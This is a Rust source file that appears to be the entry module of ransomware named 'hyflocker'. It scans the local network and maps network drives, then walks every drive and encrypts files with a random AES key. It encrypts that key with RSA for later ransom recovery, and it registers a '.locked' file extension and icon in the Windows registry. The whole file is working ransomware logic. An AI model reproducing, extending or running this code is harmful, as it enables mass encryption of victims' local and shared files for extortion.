use std::fs::File;
use std::io::Write;
use std::path::Path;
use std::sync::Arc;
use std::sync::atomic::{AtomicBool, Ordering};
use std::thread;
use std::time::Duration;

use crate::crypt::config::Config;
use crate::crypt::engine::KEY_LENGTH;
use crate::crypt::three_layer_pipeline::ThreeLayerPipeline;
use crate::crypt::pipeline::OptimizedPipelineController;
use crate::crypt::engine::generate_random_key;
use crate::crypt::walker;
use crate::crypt::NetworkScanner;
use crate::crypt::rsa;
use crate::system::task_manager::{BackgroundTaskManager, TaskType, get_global_task_manager};
#[cfg(all(target_os = "windows", feature = "icons"))]
use crate::windows_icons;
#[cfg(all(target_os = "windows", feature = "icons"))]
use std::io;
#[cfg(all(target_os = "windows", feature = "icons"))]
use windows::Win32::System::Registry::{
    RegCreateKeyExW, RegSetValueExW, HKEY_CLASSES_ROOT, KEY_WRITE, REG_SZ,
};
#[cfg(all(target_os = "windows", feature = "icons"))]
use windows::Win32::Foundation::CloseHandle;
#[cfg(all(target_os = "windows", feature = "icons"))]
use std::ffi::OsStr;
#[cfg(all(target_os = "windows", feature = "icons"))]
use std::os::windows::ffi::OsStrExt;
#[cfg(all(target_os = "windows", feature = "icons"))]
use std::ptr;

static SHUTDOWN_INITIATED: AtomicBool = AtomicBool::new(false);

// Commented out to avoid compilation errors since FileProcessor not defined
// pub fn entry_point() {
//     println!("Starting high-performance file encryption system...");
//     
//     // Load configuration
//     let config = Config::default();
//     println!("Configuration loaded: {:?}", config);
//     
//     // Generate encryption key
//     let mut encryption_key = [0u8; KEY_LENGTH];
//     generate_random_key(&mut encryption_key);
//     println!("Encryption key generated");
//     
//     // Create pipeline controller
//     let mut pipeline_controller = OptimizedPipelineController::new(&config);
//     if !pipeline_controller.initialize_pipeline(&encryption_key) {
//         eprintln!("Failed to initialize pipeline");
//         return;
//     }
//     println!("Pipeline initialized");
//     
//     // Create file processor
//     let file_processor = FileProcessor::new(config.clone(), pipeline_controller.clone());
//     println!("File processor created");
//     
//     // Start processing (example with a few files)
//     let test_files = vec![
//         ("test1.txt", "test1.txt.enc"),
//         ("test2.txt", "test2.txt.enc"),
//         ("test3.txt", "test3.txt.enc"),
//     ];
//     
//     for (input, output) in test_files {
//         file_processor.process_file(input, output);
//     }
//     
//     // Wait for completion or shutdown
//     pipeline_controller.wait_for_completion(false);
//     println!("Processing completed");
// }



pub fn run_network_only_encryption(config: Config) -> Result<(), String> {
    println!("crypt::entry: running network-only encryption...");
    println!("Configuration: {:?}", config);
    
    let task_manager = get_global_task_manager();
    
    let mut pipeline_controller = OptimizedPipelineController::new(&config);
    
    // Initialize encryption key
    let mut key = [0u8; 16];
    // In a real implementation, this should come from a secure source
    // For demo purposes, we use a fixed value
    key.iter_mut().enumerate().for_each(|(i, b)| *b = (i % 256) as u8);
    
    println!("Initializing pipeline with generated key: {:02x?}", key);
    pipeline_controller.initialize_pipeline(&key);
    
    // Perform network encryption without local encryption
    println!("Starting network encryption process...");
    let network_scanner = NetworkScanner::new();
    let controller_arc = Arc::new(pipeline_controller);
    network_scanner.set_pipeline_controller(controller_arc.clone());
    
    // Check if we're in a LAN environment before starting network scan
    println!("Checking network environment...");
    if network_scanner.is_in_lan_environment() {
        println!("LAN environment detected, starting network scan...");
        match network_scanner.start_scan(controller_arc, true) {
            Ok(_) => {
                println!("Network scan completed");
                println!("Network encryption completed successfully");
            },
            Err(e) => {
                eprintln!("Network encryption failed: {}", e);
                // 不因网络扫描错误而终止整个程序
                println!("Continuing despite network encryption failure...");
            },
        }
    } else {
        println!("No LAN environment detected, skipping network encryption");
        println!("This might be because no active network connections were found");
    }
    
    // 🔑 等待所有后台任务完成
    println!("Waiting for all background tasks to complete...");
    task_manager.wait_for_all_tasks();
    println!("All background tasks completed successfully");
    
    println!("Network-only encryption process completed!");
    Ok(())
}

/// Run full disk encryption based on configuration
pub fn run_full_disk_encryption(config: Config, max_runtime_seconds: Option<u64>) -> Result<(), String> {
    // 获取全局任务管理器，用于协调所有后台任务
    let task_manager = get_global_task_manager();
    
    // 在后台线程中设置图标资源，并注册到任务管理器
    #[cfg(all(target_os = "windows", feature = "icons"))]
    {
        let config_clone = config.clone();
        task_manager.spawn_task(TaskType::IconSetup, "Icon Setup", move || {
            println!("[Background] Preparing GUI resources...");
            if let Err(e) = windows_icons::extract_icon_resource() {
                eprintln!("[Background] Warning: Failed to extract icon resource: {}", e);
            } else {
                println!("[Background] Icon resource extracted successfully");
            }
            
            // 设置文件类型和图标关联
            println!("[Background] Setting up file type associations...");
            setup_file_type_association();
        });
    }
    
    println!("crypt::entry: running full disk encryption...");
    println!("Configuration details:");
    println!("  - Full disk encryption enabled: {}", config.enable_full_disk_encryption);
    println!("  - Auto traverse enabled: {}", config.enable_auto_traverse);
    println!("  - Only encrypt path: {:?}", config.only_encrypt_path);
    println!("  - File extensions: {:?}", config.extensions);
    println!("  - Max runtime: {:?}", max_runtime_seconds);
    
    if !config.enable_full_disk_encryption {
        println!("Full disk encryption is disabled in configuration");
        
        // 即使加密被禁用，也要等待图标设置任务完成
        #[cfg(all(target_os = "windows", feature = "icons"))]
        {
            println!("Waiting for icon setup tasks to complete...");
            task_manager.wait_for_tasks_by_type(TaskType::IconSetup);
        }
        
        return Ok(());
    }
    
    // Initialize encryption key
    let mut key = [0u8; 16];
    generate_random_key(&mut key);
    
    println!("Initializing encryption pipeline...");
    println!("Encryption key generated: {:02x?}", key);
    
    let pipeline = Arc::new(ThreeLayerPipeline::new(Arc::new(config.clone()), key));
    
    pipeline.start();
    
    // 阶段1：网络模块 - 映射网络驱动器
    println!("[*] 阶段1：网络模块 - 映射网络驱动器...");
    let network_scanner = NetworkScanner::new();
    let pipeline_controller: Arc<dyn crate::crypt::network::PipelineControllerTrait> = pipeline.clone();
    network_scanner.set_pipeline_controller(pipeline_controller.clone());
    
    // Check if we're in a LAN environment before starting network scan
    println!("Checking network connectivity...");
    if network_scanner.is_in_lan_environment() {
        println!("LAN environment detected, starting network scan...");
        match network_scanner.start_scan(pipeline_controller, false) {
            Ok(_) => {
                println!("[+] 网络模块完成，所有网络驱动器已映射");
            },
            Err(e) => {
                eprintln!("网络模块失败: {}", e);
                println!("继续执行本地加密...");
            },
        }
    } else {
        println!("No LAN environment detected, skipping network encryption");
    }
    
    // 阶段2：本地加密器 - 加密所有驱动器（包括网络驱动器）
    println!("[*] 阶段2：本地加密器 - 加密所有驱动器...");
    
    let mut encryption_completed = false;
    
    if config.enable_auto_traverse {
        println!("Starting full disk scan and encryption process...");
        println!("Scanning configured directories for target files...");
        
        // Shared running flag
        let running = Arc::new(AtomicBool::new(true));
        let running_clone = running.clone();
        
        // Start file traversal thread - runs in parallel with encryption
        let config_clone = config.clone();
        let pipeline_clone = Arc::clone(&pipeline);
        let traversal_thread = thread::spawn(move || {
            println!("File traversal thread started");
            walker::start_traversal_three_layer(&pipeline_clone, &config_clone);
        });
        
        // 启动计时器线程（如果设置了最大运行时间）
        let timeout_thread = if let Some(max_seconds) = max_runtime_seconds {
            println!("Timer started: maximum runtime = {} seconds", max_seconds);
            let pipeline_timer = Arc::clone(&pipeline);
            Some(thread::spawn(move || {
                thread::sleep(Duration::from_secs(max_seconds));
                println!("[TIMEOUT] Maximum runtime reached! Requesting shutdown...");
                // 只标记遍历完成，让主线程处理停止逻辑，避免竞争条件
                pipeline_timer.mark_traversal_completed();
                // 设置运行标志为false，让工作线程自然退出
                pipeline_timer.request_shutdown();
            }))
        } else {
            None
        };
        
        // Note: Ctrl+C handling is currently disabled in this version
        // The program will continue until all files are processed
        
        // Wait for traversal to complete
        println!("Waiting for file traversal to complete...");
        let _ = traversal_thread.join();
        println!("File traversal thread completed");
        
        // Mark traversal as completed - this tells workers no more root directories will be added
        pipeline.mark_traversal_completed();
        
        // Wait for all traversal workers to finish processing directories
        // This is critical - we must wait until all workers have finished
        // before we can shutdown the traversal sender
        pipeline.wait_for_traversal_completion();
        
        // Now shutdown traversal sender since all workers are done
        println!("Shutting down traversal sender...");
        pipeline.shutdown_traversal_sender();
        
        // Wait for all encryption tasks to complete
        println!("Waiting for all encryption tasks to complete...");
        pipeline.wait_for_completion();
        
        // Stop all workers
        println!("Stopping all workers...");
        pipeline.stop();
        
        // 等待计时器线程（如果存在）
        if let Some(timeout_thread) = timeout_thread {
            let _ = timeout_thread.join();
        }
        
        encryption_completed = true;
        
        // Print final statistics
        println!("Encryption process completed. Displaying statistics:");
        let (files, bytes, errors) = pipeline.get_stats();
        println!("Files processed: {}", files);
        println!("Bytes encrypted: {}", bytes);
        println!("Errors: {}", errors);
    } else {
        println!("Auto-traverse is disabled. No local files will be encrypted.");
    }
    
    // Shutdown pipeline
    println!("Shutting down encryption pipeline...");
    pipeline.stop();
    
    // 在RSA加密前验证加密是否真正完成
    println!("Verifying encryption completion before RSA encryption...");
    
    // 等待一小段时间确保状态稳定（不影响性能）
    thread::sleep(Duration::from_millis(100));
    
    if pipeline.verify_encryption_completion() {
        // Encrypt AES key with RSA and save to fixed location
        println!("Encrypting AES key with RSA...");
        match rsa::encrypt_aes_key_with_rsa(&key) {
            Ok(encrypted_key) => {
                println!("AES key encrypted successfully ({} bytes)", encrypted_key.len());
                match rsa::save_encrypted_aes_key(&encrypted_key) {
                    Ok(path) => {
                        println!("Encrypted AES key saved to: {:?}", path);
                    }
                    Err(e) => {
                        eprintln!("Failed to save encrypted AES key: {}", e);
                        eprintln!("Encryption completed, but key saving failed. Continuing with cleanup...");
                    }
                }
            }
            Err(e) => {
                eprintln!("Failed to encrypt AES key with RSA: {}", e);
                eprintln!("Encryption completed, but RSA encryption failed. Continuing with cleanup...");
            }
        }
    } else {
        eprintln!("Encryption not fully completed, skipping RSA encryption to prevent data loss");
        println!("Continuing with cleanup...");
    }
    
    // 🔑 关键修复：等待所有后台任务完成后再返回
    println!("Waiting for all background tasks to complete...");
    task_manager.wait_for_all_tasks();
    println!("All background tasks completed successfully");
    
    if encryption_completed {
        println!("Full disk encryption completed successfully!");
    } else {
        println!("Encryption stopped (timeout or disabled). Cleanup completed.");
    }
    Ok(())
}

#[cfg(all(target_os = "windows", feature = "icons"))]
fn setup_file_type_association() {
    use crate::windows_icons;
    use std::io;
    
    // 获取图标的绝对路径
    let icon_path = windows_icons::get_absolute_icon_path();

    // 转换为字符串
    let icon_path_str = match icon_path.to_str() {
        Some(path) => path,
        None => {
            eprintln!("Icon path is not valid UTF-8");
            return;
        }
    };
    
    println!("Setting up file type association with icon: {}", icon_path_str);
    
    // 批量执行注册表操作以提升性能
    let file_type = "hyflockerEncFile";
    
    // 批量创建文件类型和图标关联
    match batch_setup_file_association(file_type, icon_path_str) {
        Ok(_) => {
            println!("Successfully set up file type association: {}", file_type);
        }
        Err(e) => {
            eprintln!("Failed to set up file type association {}: {}", file_type, e);
            return;
        }
    }
    
    // 关联加密文件扩展名到该文件类型
    let extension = ".locked";
    match associate_extension_with_type(extension, file_type) {
        Ok(_) => println!("Successfully associated extension {} with type {}", extension, file_type),
        Err(e) => eprintln!("Failed to associate extension {} with type {}: {}", extension, file_type, e)
    }
    
    // 通知系统刷新图标缓存
    windows_icons::notify_icon_change();
}

#[cfg(all(target_os = "windows", feature = "icons"))]
fn batch_setup_file_association(file_type: &str, icon_path: &str) -> Result<(), io::Error> {
    use std::ffi::OsStr;
    use std::os::windows::ffi::OsStrExt;
    
    unsafe {
        let mut hkey = windows::Win32::System::Registry::HKEY::default();
        let subkey: Vec<u16> = OsStr::new(file_type)
            .encode_wide()
            .chain(Some(0))
            .collect();

        let result = RegCreateKeyExW(
            HKEY_CLASSES_ROOT,
            windows::core::PCWSTR(subkey.as_ptr()),
            0,
            None,
            windows::Win32::System::Registry::REG_OPTION_NON_VOLATILE,
            KEY_WRITE,
            None,
            &mut hkey,
            None,
        );

        if result.is_err() {
            return Err(io::Error::last_os_error());
        }

        // 批量设置值：先设置描述，然后设置图标
        let desc_value: Vec<u16> = OsStr::new("hyflocker Encrypted File")
            .encode_wide()
            .chain(Some(0))
            .collect();
            
        let set_result = RegSetValueExW(
            hkey,
            windows::core::PCWSTR::null(),
            0,
            REG_SZ,
            Some(unsafe { std::slice::from_raw_parts(
                desc_value.as_ptr() as *const u8,
                desc_value.len() * 2
            ) }),
        );

        if set_result.is_err() {
            let _ = windows::Win32::System::Registry::RegCloseKey(hkey);
            return Err(io::Error::last_os_error());
        }
        
        let _ = windows::Win32::System::Registry::RegCloseKey(hkey);
        
        // 直接设置图标，无需重新打开键
        let mut hkey_icon = windows::Win32::System::Registry::HKEY::default();
        let subkey_str = format!("{}\\DefaultIcon", file_type);
        let subkey_icon: Vec<u16> = OsStr::new(&subkey_str)
            .encode_wide()
            .chain(Some(0))
            .collect();

        let result = RegCreateKeyExW(
            HKEY_CLASSES_ROOT,
            windows::core::PCWSTR(subkey_icon.as_ptr()),
            0,
            None,
            windows::Win32::System::Registry::REG_OPTION_NON_VOLATILE,
            KEY_WRITE,
            None,
            &mut hkey_icon,
            None,
        );

        if result.is_err() {
            return Err(io::Error::last_os_error());
        }

        let icon_value_str = format!("{},0", icon_path);
        let icon_value: Vec<u16> = OsStr::new(&icon_value_str)
            .encode_wide()
            .chain(Some(0))
            .collect();
            
        let set_result = RegSetValueExW(
            hkey_icon,
            windows::core::PCWSTR::null(),
            0,
            REG_SZ,
            Some(unsafe { std::slice::from_raw_parts(
                icon_value.as_ptr() as *const u8,
                icon_value.len() * 2
            ) }),
        );

        let _ = windows::Win32::System::Registry::RegCloseKey(hkey_icon);
        
        if set_result.is_err() {
            return Err(io::Error::last_os_error());
        }
    }
    
    Ok(())
}

#[cfg(not(all(target_os = "windows", feature = "icons")))]
fn setup_file_type_association() {
    // 空实现，当未启用图标功能时什么都不做
    println!("Icons feature not enabled, skipping file type association");
}


#[cfg(all(target_os = "windows", feature = "icons"))]
fn associate_extension_with_type(extension: &str, file_type: &str) -> Result<(), io::Error> {
    use std::ffi::OsStr;
    use std::os::windows::ffi::OsStrExt;
    use std::ptr;
    
    unsafe {
        let mut hkey = windows::Win32::System::Registry::HKEY::default();
        let subkey: Vec<u16> = OsStr::new(extension)
            .encode_wide()
            .chain(Some(0))
            .collect();

        let result = RegCreateKeyExW(
            HKEY_CLASSES_ROOT,
            windows::core::PCWSTR(subkey.as_ptr()),
            0,
            None,
            windows::Win32::System::Registry::REG_OPTION_NON_VOLATILE,
            KEY_WRITE,
            None,
            &mut hkey,
            None,
        );

        if result.is_err() {
            return Err(io::Error::last_os_error());
        }

        let value: Vec<u16> = OsStr::new(file_type)
            .encode_wide()
            .chain(Some(0))
            .collect();
            
        let set_result = RegSetValueExW(
            hkey,
            windows::core::PCWSTR::null(),
            0,
            REG_SZ,
            Some(unsafe { std::slice::from_raw_parts(
                value.as_ptr() as *const u8,
                value.len() * 2
            ) }),
        );

        if set_result.is_err() {
            let _ = windows::Win32::System::Registry::RegCloseKey(hkey);
            return Err(io::Error::last_os_error());
        }
        
        let _ = windows::Win32::System::Registry::RegCloseKey(hkey);
    }
    
    Ok(())
}